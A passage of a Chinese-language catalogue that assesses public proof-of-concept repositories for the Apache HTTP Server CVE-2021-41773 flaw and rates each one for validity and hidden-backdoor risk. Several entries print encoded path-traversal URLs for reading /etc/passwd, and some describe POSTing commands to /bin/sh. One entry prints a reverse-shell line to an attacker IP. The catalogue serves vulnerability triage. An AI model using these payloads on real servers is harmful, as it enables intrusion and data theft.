1.  **路径遍历：** 攻击者通过在URL中使用经过特殊编码的路径（例如，`.%2e/%2e%2e`）来绕过服务器的路径检查，从而访问受限目录之外的文件。PoC代码中提供了两个路径遍历Payload `payload1`和`payload2`，利用 `GET` 请求读取文件内容。
2.  **远程代码执行：** 如果服务器配置允许执行CGI脚本，攻击者可以通过路径遍历访问到`bin/sh`，然后通过POST请求将命令作为数据传递给`bin/sh`执行。PoC代码中构造了包含命令的POST请求，利用`req.Session()`和`req.Request()`发送请求并接收响应，实现交互式shell。

**总结：**
该漏洞的利用需要目标服务器存在漏洞版本（2.4.49或2.4.50），并且在路径遍历访问到文件之后，如果服务器配置允许，可以进一步利用CGI执行进行远程代码执行。提供的PoC代码可以成功验证并利用该漏洞，未发现投毒风险。

**项目地址:** [blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution](https://github.com/blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #23

**来源**: [CVE-2021-41773-blu3ming_PoC-CVE-2021-41773.md](../2021/CVE-2021-41773-blu3ming_PoC-CVE-2021-41773.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且受影响的Alias-like指令配置允许访问受限目录外的文件，同时CGI脚本未被禁用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径遍历漏洞。该漏洞源于Apache HTTP Server对路径规范化处理的缺陷。攻击者可以通过构造包含URL编码的路径遍历序列的恶意HTTP请求，绕过服务器的安全检查，读取服务器上任意文件，甚至可能执行任意代码。

**有效性分析：**

提供的PoC代码通过构造包含`/.%2e/%2e%2e/%2e%2e/%2e%2e/`的URL，利用Apache HTTP Server 2.4.49的路径遍历漏洞读取指定文件。PoC代码使用`urllib3`库发送HTTP请求，避免了`requests`库自动URL规范化导致的利用失败。
根据漏洞库信息、搜索引擎结果和PoC代码，可以判断该PoC代码有效。

**投毒风险分析：**

对提供的PoC代码进行分析，主要包括以下几个文件：

*   `README.md`: 描述了漏洞的详细信息、利用方法和示例。没有发现恶意代码。
*   `cve-2021-41773.py`: 漏洞利用脚本。该脚本的功能是发送包含恶意路径的HTTP请求，读取指定文件。没有发现明显的恶意代码，但存在潜在风险，即攻击者可能利用该脚本读取服务器上的敏感信息，并进行进一步的攻击。不过从代码本身来看，功能单一，不包含任何额外的后门或者恶意功能。
*   `requirements.txt`: 声明了所需的Python依赖库，包括`requests`和`urllib3`。这两个库都是常用的Python库，没有发现恶意库。

综合分析，该仓库中存在作者隐藏的投毒代码的可能性较低，但不能完全排除攻击者利用该脚本进行恶意活动的风险。

**利用方式：**

1.  **确定目标服务器：** 确定运行Apache HTTP Server 2.4.49的目标服务器。
2.  **检查配置：** 检查目标服务器的`Alias-like`指令配置，确认是否存在允许访问受限目录外的文件的配置。
3.  **构造恶意URL：** 构造包含URL编码的路径遍历序列的恶意URL，例如：`http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd`。
4.  **发送HTTP请求：** 使用PoC脚本或其他工具发送包含恶意URL的HTTP请求。
5.  **读取文件：** 如果漏洞利用成功，服务器将返回指定文件的内容。
6. **远程代码执行：** 如果CGI脚本被允许执行，攻击者可以上传一个恶意的CGI脚本并执行，从而实现远程代码执行。

**项目地址:** [blu3ming/PoC-CVE-2021-41773](https://github.com/blu3ming/PoC-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #24

**来源**: [CVE-2021-41773-charanvoonna_CVE-2021-41773.md](../2021/CVE-2021-41773-charanvoonna_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49版本，并且配置允许CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于对路径规范化处理的更改存在缺陷导致。攻击者可以利用路径遍历攻击将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到默认配置 "require all denied" 的保护，则请求可能会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且已被广泛利用。提供的 Dockerfile 和 README.md 文件提供了一个可行的漏洞利用方式。

**利用方式：**
1.  **路径遍历：** 攻击者可以通过构造包含 `..` 或 URL 编码的 `..%2f` 的恶意 URL，绕过服务器的路径检查，访问受限文件。
2.  **CGI 执行：** 如果目标服务器启用了 CGI 脚本执行，攻击者可以通过路径遍历访问 CGI 脚本，并执行任意代码。

**POC 代码分析：**

*   **Dockerfile:** 该 Dockerfile 用于构建一个存在 CVE-2021-41773 漏洞的 Apache HTTP Server 2.4.49 环境。
    *   `FROM httpd:2.4.49`：指定使用 Apache HTTP Server 2.4.49 镜像作为基础镜像。
    *   `RUN sed -i 's/#LoadModule cgi_module/LoadModule cgi_module/' /usr/local/apache2/conf/httpd.conf`：启用 CGI 模块。
    *   `RUN echo ...`：配置 CGI 目录，允许执行 CGI 脚本。
    *   `RUN echo "AllowEncodedSlashes On" >> /usr/local/apache2/conf/httpd.conf`：允许 URL 中包含编码的斜杠，这是利用该漏洞的关键。
    *   `COPY test.cgi /usr/local/apache2/cgi-bin/test.cgi`：复制一个测试 CGI 脚本到 CGI 目录下。
    *   `RUN chmod +x /usr/local/apache2/cgi-bin/test.cgi`：为测试 CGI 脚本添加执行权限。
*   **README.md:** 该文件描述了 CVE-2021-41773 漏洞的细节，以及如何使用 Nmap NSE 脚本检测该漏洞。提供了 Nmap 脚本的架构、payload 设置、HTTP 请求和响应处理、输出格式和错误处理。

**投毒风险：**
提供的 Dockerfile 主要用于搭建漏洞环境以进行验证，风险极低。它本身没有包含恶意代码。
虽然 *test.cgi* 文件内容未知，这里假设 *test.cgi* 为安全的代码，否则投毒的概率会升高。
综合评估投毒风险为 1%。


**项目地址:** [charanvoonna/CVE-2021-41773](https://github.com/charanvoonna/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #25

**来源**: [CVE-2021-41773-dileepdkumar_LayarKacaSiber-CVE-2021-41773.md](../2021/CVE-2021-41773-dileepdkumar_LayarKacaSiber-CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution (RCE)

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件或执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。该漏洞源于对路径规范化的更改，使得攻击者可以使用路径遍历攻击将URL映射到Alias-like指令配置的目录之外的文件。如果这些目录之外的文件没有受到默认配置"require all denied"的保护，请求可能会成功。如果CGI脚本对这些别名路径启用，则可能导致远程代码执行。

**利用方式：**
攻击者可以构造包含编码后的路径遍历字符（例如`.%2e`）的HTTP请求，绕过服务器的安全检查，访问服务器文件系统上的任意文件。如果服务器配置允许执行CGI脚本，攻击者可以通过上传恶意脚本并执行来实现远程代码执行。

**有效性：**
提供的PoC代码`exploit.sh`看起来是有效的。它使用`curl`命令发送包含路径遍历序列的请求，并尝试执行指定的命令。Dockerfile和httpd-path-traversal.conf文件配置了一个易受攻击的Apache服务器环境，用于测试路径遍历。

**投毒风险：**
检查提供的文件，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/README.md`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/exploit.sh`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/Path Traversal/Dockerfile`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/Path Traversal/httpd-path-traversal.conf`。这些文件看起来主要用于演示和利用CVE-2021-41773漏洞。其中，`exploit.sh`脚本存在一定的风险，攻击者可以利用此脚本执行恶意命令。`httpd-path-traversal.conf` 配置，如果被攻击者修改，会导致服务器存在后门，但是从目前的代码来看，投毒风险较低。只有 `exploit.sh`存在可被利用的风险，但这不是作者主动投毒，所以投毒风险很低。

**项目地址:** [dileepdkumar/LayarKacaSiber-CVE-2021-41773](https://github.com/dileepdkumar/LayarKacaSiber-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #26

**来源**: [CVE-2021-41773-gunzf0x_CVE-2021-41773.md](../2021/CVE-2021-41773-gunzf0x_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历和RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并启用了cgi-bin目录的执行权限

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中。攻击者可以通过构造包含特殊编码的 URL，利用路径遍历漏洞访问受限目录之外的文件。如果服务器配置允许 CGI 脚本执行，则可以进一步利用该漏洞执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的 PoC 代码，此漏洞利用是有效的。漏洞库中提到该漏洞已在野外被利用，多个搜索结果也证实了该漏洞的存在和潜在危害，并提供了利用示例。PoC 代码实现了利用路径遍历漏洞执行命令的功能。

**投毒风险：**
PoC 代码主要功能是利用漏洞实现远程命令执行。以下是对代码可能存在的投毒风险的分析：

*   **代码结构和功能：** PoC 代码结构清晰，主要包括参数解析、URL 构造和 HTTP 请求发送等功能。这些功能都与漏洞利用直接相关。
*   **潜在的风险点：**  PoC 代码中存在一些潜在的风险点：
    *   `data_payload: str = f"echo Content-Type: text/plain; echo; {args.command}"` ，args.command参数如果被恶意构造，可能会导致执行非预期的系统命令。
        *   虽然`clean_url`函数旨在清理URL，但可能存在绕过的风险。

总体来说，代码的投毒风险较低，大概在5%。主要风险集中在命令执行的参数上，以及URL清洗函数可能存在的绕过。

**利用方式：**
1.  **确定目标：** 找到运行 Apache HTTP Server 2.4.49 的目标服务器，并确认 `cgi-bin` 目录已启用。
2.  **构造 Payload：** 使用包含路径遍历的 URL 和要执行的命令构造 HTTP POST 请求。URL 的基本格式如下：
    ```
    /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
    ```
    其中，`.%2e` 是 `..` 的 URL 编码，用于绕过路径检查。`bin/sh` 是要执行的 shell 程序的路径。
3.  **发送请求：**  将构造好的 HTTP POST 请求发送到目标服务器。
4.  **获取结果：**  如果漏洞利用成功，服务器将执行指定的命令，并将结果作为 HTTP 响应返回。

**项目地址:** [gunzf0x/CVE-2021-41773](https://github.com/gunzf0x/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #27

**来源**: [CVE-2021-41773-hackedrishi_CTF_WRITEUPS-TryHackMe-CVE-2021-41773-.md](../2021/CVE-2021-41773-hackedrishi_CTF_WRITEUPS-TryHackMe-CVE-2021-41773-.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like指令配置不当或CGI脚本启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径穿越漏洞。攻击者可以通过构造包含`..`的恶意URL，绕过Alias-like指令配置的目录限制，访问服务器上的任意文件。如果目标服务器启用了CGI脚本，攻击者可能进一步利用该漏洞执行远程代码。根据漏洞描述，需要特定的配置错误，例如，文件没有被"require all denied"保护。从提供的漏洞利用代码看， 该代码本身是一个 CTF 的 Writeup， 解释了漏洞原理和利用方式，本身不包含恶意代码，但可能存在作者隐藏的后门代码的风险，但是可能性极低。

**有效性：**
该漏洞利用代码(CTF Writeup) 本身不直接用于漏洞利用，而是用于解释该漏洞，根据搜索引擎结果，该漏洞真实存在且被广泛利用。

**投毒风险：**
提供的漏洞利用代码是一个CTF Writeup，主要用于讲解漏洞原理，本身不太可能包含恶意投毒代码， 但为了安全起见， 风险评估为5%。

**利用方式：**
1.  **路径穿越：** 构造包含`..`的URL，例如`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试访问服务器上的敏感文件，如`/etc/passwd`。
2.  **RCE（如果CGI启用）：**如果服务器配置允许执行CGI脚本，攻击者可以通过上传恶意CGI脚本并执行它，来实现远程代码执行。 需要注意的是，通常需要结合Alias指令的配置不当才能实现。

**利用前提：**
*   Apache HTTP Server版本为2.4.49。
*   目标文件所在目录没有被`require all denied`限制。
*   （可选）服务器启用了CGI脚本，并且Alias指令配置不当。

**项目地址:** [hackedrishi/CTF_WRITEUPS-TryHackMe-CVE-2021-41773-](https://github.com/hackedrishi/CTF_WRITEUPS-TryHackMe-CVE-2021-41773-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #28

**来源**: [CVE-2021-41773-javaamo_CVE-2021-41773.md](../2021/CVE-2021-41773-javaamo_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的Apache HTTP Server 2.4.49版本，并启用了cgi-bin目录，且该目录下的文件没有被'require all denied'保护

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 漏洞是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞。攻击者可以通过构造包含特殊字符的 URL，绕过 Alias 类似的指令配置的目录限制，访问到服务器上的任意文件。如果服务器同时启用了 CGI 脚本支持，攻击者甚至可以执行任意代码。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，该漏洞利用是有效的。搜索引擎结果也表明该漏洞已被公开利用。

**投毒风险：**
提供的漏洞利用代码主要由一个shell脚本和一个README文件组成。shell脚本的功能是向目标服务器发送包含恶意路径的HTTP请求，读取指定文件或执行命令。README文件是对漏洞利用代码的说明。
脚本本身存在投毒的可能性较低，风险预估1%。主要风险点在于targets.txt文件，如果攻击者替换了targets.txt中的目标，可能会导致非授权的扫描或者攻击。需要注意的是，该PoC本身就是用于攻击的，因此不能将利用漏洞的代码判定为投毒。

**利用方式：**
1.  准备：准备一个包含目标服务器地址列表的 `targets.txt` 文件。
2.  路径遍历：使用`./50383.sh targets.txt /etc/passwd`尝试读取敏感文件，例如`/etc/passwd`。
3.  远程代码执行：如果目标服务器启用了 CGI，则可以通过类似`./50383.sh targets.txt /bin/sh whoami`的方式执行命令。
   需要注意的是，该POC代码尝试利用路径遍历漏洞，将请求发送到`/cgi-bin/`目录，从而触发CGI脚本的执行，最终达到远程代码执行的目的. 如果CGI未开启，则只能进行文件读取。

**项目地址:** [javaamo/CVE-2021-41773](https://github.com/javaamo/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #29

**来源**: [CVE-2021-41773-jkska23_Additive-Vulnerability-Analysis-CVE-2021-41773.md](../2021/CVE-2021-41773-jkska23_Additive-Vulnerability-Analysis-CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历和文件泄露

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且Alias配置存在缺陷，允许访问受限目录外的文件，并且可能开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

**有效性分析：**

根据漏洞库信息和搜索引擎结果，CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞，且已被公开利用。搜索引擎结果显示该漏洞允许未经验证的攻击者访问敏感信息，甚至执行任意代码。漏洞库信息也证实了这一点，并指出该漏洞允许攻击者绕过 Alias 指令配置的目录限制，访问未受 "require all denied" 保护的文件。如果目标配置允许，还可能执行 CGI 脚本。

**投毒风险分析：**

提供的“漏洞利用代码”实际上包含两个文件：README.md 和 index.html。

*   **README.md：**  只是一个简单的文本文件，描述了该漏洞和远程代码执行。
*   **index.html：** 是由 pdf2htmlEX 生成的 HTML 文件，用于显示 PDF 内容。这个HTML 文件看起来是正常的，没有任何明显的恶意代码，它的作用仅仅是将PDF转换成了HTML，并没有什么可疑的js或者链接。

因此，提供的代码仓库中**没有**发现任何明显的投毒代码。 投毒风险极低，几乎为0%的可能性

**利用方式：**

利用 CVE-2021-41773 的基本方式是通过构造包含路径遍历字符（如`..%2f`）的 URL 来访问目标服务器上的任意文件。攻击者可以尝试以下步骤：

1.  **确定目标服务器是否运行 Apache HTTP Server 2.4.49。**
2.  **尝试使用路径遍历payload访问敏感文件，例如`/../../../../etc/passwd`。** 使用URL编码来绕过一些常见的安全过滤。
3.  **如果服务器配置允许，尝试执行任意 CGI 脚本。**  这通常涉及到上传恶意脚本并使用路径遍历漏洞来访问和执行它。

**漏洞利用的关键点：**

*   **Alias配置：**  该漏洞依赖于 Apache HTTP Server 的 Alias 指令配置不当。
*   **权限控制：**  被访问的文件必须没有受到 "require all denied" 的保护。
*   **CGI支持：**  如果开启了 CGI 支持，则可能导致远程代码执行。

**项目地址:** [jkska23/Additive-Vulnerability-Analysis-CVE-2021-41773](https://github.com/jkska23/Additive-Vulnerability-Analysis-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #30

**来源**: [CVE-2021-41773-justakazh_mass_cve-2021-41773.md](../2021/CVE-2021-41773-justakazh_mass_cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件和/或执行远程代码

**影响版本:** 2.4.49

**利用条件:** 目标系统运行受影响的 Apache HTTP Server 版本，并配置了Alias指令或启用了CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。该漏洞允许攻击者通过构造包含特殊字符（如 URL 编码的 `%2e` 和 `%2e%2e`）的 URL，来访问服务器上受限目录之外的文件。

**有效性:**

根据漏洞库信息，该漏洞已在野外被利用。提供的 exploit-db 链接 (在 `mass_cve-2021-41773/README.md` 中) 也验证了这一点。提供的python脚本 `cve-2021-41773.py`  通过读取 `/etc/passwd` 文件来检测漏洞存在。另一个脚本 `cve-2021-41773_RCE.py` 尝试通过 cgi-bin 执行命令 `uname`，如果返回 `Linux` 或 `linux`，则认为存在 RCE 漏洞。

**投毒风险:**

检查提供的代码，没有发现明显的恶意或后门代码。所有的脚本都是为了验证漏洞的存在，而不是植入任何持久性的后门。`cve-2021-41773.py`  扫描目标然后保存结果, `cve-2021-41773_RCE.py`  是RCE验证脚本。`cve-2021-41773_manual.py` 允许手动指定命令执行. 因此投毒风险评估为0%。

**利用方式:**

1.  **路径遍历 (文件读取):**  攻击者发送一个精心构造的 HTTP GET 请求，其中包含经过 URL 编码的路径遍历字符，例如 `/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`。如果服务器存在漏洞且目录配置不当，服务器将返回 `/etc/passwd` 的内容。
2.  **远程代码执行 (RCE):**  如果服务器启用了 CGI 脚本执行，攻击者可以使用路径遍历来访问和执行任意脚本。`cve-2021-41773_RCE.py` 脚本通过POST请求向URL发送命令, 例如 `uname`，如果执行成功, 则判定可以RCE.  利用需要服务器配置支持 CGI 脚本，且目标路径没有 require all denied 配置。

**项目地址:** [justakazh/mass_cve-2021-41773](https://github.com/justakazh/mass_cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #31

**来源**: [CVE-2021-41773-khaidtraivch_CVE-2021-41773-Apache-2.4.49-.md](../2021/CVE-2021-41773-khaidtraivch_CVE-2021-41773-Apache-2.4.49-.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可读取敏感文件并远程执行代码

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且启用了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用具有较高的有效性。

**有效性：**

*   漏洞库明确指出该漏洞已被在野利用。
*   搜索结果显示该漏洞允许未经身份验证的攻击者读取敏感信息并执行任意代码。
*   提供的POC代码包含利用路径遍历读取`/etc/passwd`文件的脚本以及通过CGI执行反向shell的脚本，证明了漏洞的可利用性。

**投毒风险：**

虽然POC代码本身实现了明确的漏洞利用功能，但考虑到其来源的安全性无法完全保证，仍存在潜在的投毒风险。具体分析如下：

*   代码的功能相对简单直接，主要依赖于`curl`命令发送HTTP请求。潜在的投毒方式可能包括：
    *   **变量替换：** 攻击者可能尝试修改`TARGET_IP`或`ATTACKER_IP`变量，将利用流量引导至恶意服务器。
    *   **命令注入：** 攻击者可能尝试通过修改`URL`或`POST`数据中的参数，实现命令注入，从而执行恶意代码。虽然在提供的代码中直接注入恶意代码的难度较高，但仍然不能完全排除这种可能性。
    *   **依赖库问题：** 虽然POC主要依赖`curl`和`bash`，但如果运行环境存在其他未知的依赖库，可能存在通过这些依赖库进行投毒的风险。

由于代码较为简短，且功能较为直接，恶意代码隐藏的空间有限。因此，投毒风险相对较低，估计在10%左右。

**利用方式：**

该漏洞的利用方式如下：

1.  **路径遍历：** 利用Apache HTTP Server 2.4.49在路径规范化方面的缺陷，通过构造包含`.%2e`的URL，绕过Alias-like指令的限制，访问服务器上的任意文件。如果目标文件没有被"require all denied"等配置保护，则可以成功读取文件内容，例如`/etc/passwd`。
2.  **远程代码执行：** 如果服务器配置允许CGI脚本执行，攻击者可以通过构造特殊的HTTP POST请求，将恶意代码作为CGI脚本的输入，从而在服务器上执行任意命令。例如，可以使用`bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1`命令建立反向shell，从而完全控制目标服务器。

**防范措施：**

*   升级到Apache HTTP Server 2.4.50或更高版本。
*   配置"require all denied"，限制对敏感文件的访问。
*   禁用不必要的CGI脚本执行。
*   监控服务器日志，及时发现异常请求。

**项目地址:** [khaidtraivch/CVE-2021-41773-Apache-2.4.49-](https://github.com/khaidtraivch/CVE-2021-41773-Apache-2.4.49-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #32

**来源**: [CVE-2021-41773-luongchivi_CVE-2021-41773.md](../2021/CVE-2021-41773-luongchivi_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行 (Remote Code Execution, RCE)

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且Alias指令配置不当，未对外部文件目录进行访问限制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的路径遍历漏洞。攻击者可以通过构造包含`/.%2e`或`/%2e%2e`等特殊序列的URL，绕过服务器的路径规范化检查，从而访问Alias指令配置之外的文件。

**有效性：**
提供的Dockerfile和docker-compose.yml文件用于搭建存在CVE-2021-41773漏洞的Apache HTTP Server 2.4.49环境。README.md中提供了利用该漏洞读取`/etc/passwd`文件的POC，验证了漏洞的有效性。搜索引擎结果也表明该漏洞可以被利用来进行路径遍历和远程代码执行。

**投毒风险：**
Dockerfile仅仅是从官方镜像拉取存在漏洞的镜像并复制httpd.conf，httpd.conf是基本的apache配置，没有恶意代码。docker-compose文件只是启动docker。
文件分析结果如下：
*   **Dockerfile:**  该文件用于构建包含漏洞版本的Apache镜像，没有发现恶意行为。
*   **README.md:**  该文件提供了漏洞的POC，用于验证漏洞，其中包含的命令用于读取`/etc/passwd`等文件，属于漏洞利用行为，而非投毒。
*   **docker-compose.yml:**  该文件用于配置和启动Docker容器，没有发现恶意行为。
*   **httpd.conf:**  配置文件为apache的默认配置, 没有恶意行为
虽然没发现明显的恶意代码，但如果使用者不了解漏洞原理，直接部署该环境，可能会造成安全风险。因此，存在极低的投毒风险，约5%。

**利用方式：**
1.  攻击者构造恶意的URL，其中包含`/.%2e`或`/%2e%2e`等序列，用于绕过路径规范化检查。
2.  URL指向`/cgi-bin/`目录下的文件，并利用路径遍历访问目标文件，例如`/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
3.  如果服务器配置允许执行CGI脚本，攻击者甚至可以利用该漏洞执行任意代码，例如通过POST请求传递恶意代码到目标文件。

**修复建议：**
1.  升级到Apache HTTP Server 2.4.50或更高版本。
2.  在Apache配置文件中，对根目录`/`设置`Require all denied`，防止未授权访问。

**项目地址:** [luongchivi/CVE-2021-41773](https://github.com/luongchivi/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #33

**来源**: [CVE-2021-41773-mah4nzfr_CVE-2021-41773.md](../2021/CVE-2021-41773-mah4nzfr_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且启用了 cgi-bin 目录，Alias配置不当，存在文件系统权限问题。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于路径规范化处理的缺陷导致的路径遍历漏洞，攻击者可以利用该漏洞访问服务器上受限目录之外的文件。如果服务器的 Alias 配置不当，并且文件系统权限设置不合理，攻击者甚至可以通过上传恶意 CGI 脚本来实现远程代码执行。

**有效性：**
提供的 POC 代码看起来是有效的。它利用了路径遍历漏洞，尝试访问 `/bin/sh` 可执行文件，并通过 POST 请求传递包含反向 shell 命令的 DATA。`--path-as-is` 选项确保 curl 不会对 URL 进行规范化，从而允许路径遍历。

**投毒风险：**
漏洞利用代码本身看起来比较直接，目的是触发一个反向shell。`LICENSE`文件正常。
检查以下内容：
1.  **代码混淆：** 代码没有被混淆。
2.  **隐藏命令：** 没有发现隐藏或混淆的命令。
3.  **依赖项：**  该脚本不依赖于任何外部文件或库。
4.  **作者信誉：**  作者的github需要进一步评估，但目前从代码本身看不出明显的恶意。
综合评估，存在投毒代码的可能性较低，估计为 10%。风险主要在于如果攻击成功，攻击者能够在目标系统上执行任意命令，这本身就构成了极大的安全风险。

**利用方式：**
1.  **路径遍历：**  利用 `/.%2e/%2e%2e/` 序列绕过 Apache 的路径访问限制。
2.  **CGI 执行：**  如果 `cgi-bin` 目录已启用，攻击者可以将请求指向该目录。
3.  **反向 Shell：**  通过 POST 请求，攻击者传递一个包含反向 shell 命令的字符串，该命令会在服务器上执行，从而使攻击者获得对服务器的远程访问权限。
4. **payload构造:** 首先构造畸形的URL, 包含`/.%2e/%2e%2e/` 序列, 并指定到系统程序`/bin/sh`, 通过`POST`方法,将需要执行的代码注入到`DATA`变量中.

**总结：**
CVE-2021-41773 是一个严重的安全漏洞，可以被利用进行路径遍历和远程代码执行。提供的 POC 代码可以有效利用此漏洞，但是务必在授权的情况下进行测试。代码本身投毒风险较低，但成功利用漏洞后的风险极高。

**项目地址:** [mah4nzfr/CVE-2021-41773](https://github.com/mah4nzfr/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #34

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773-PoC.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773-PoC.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

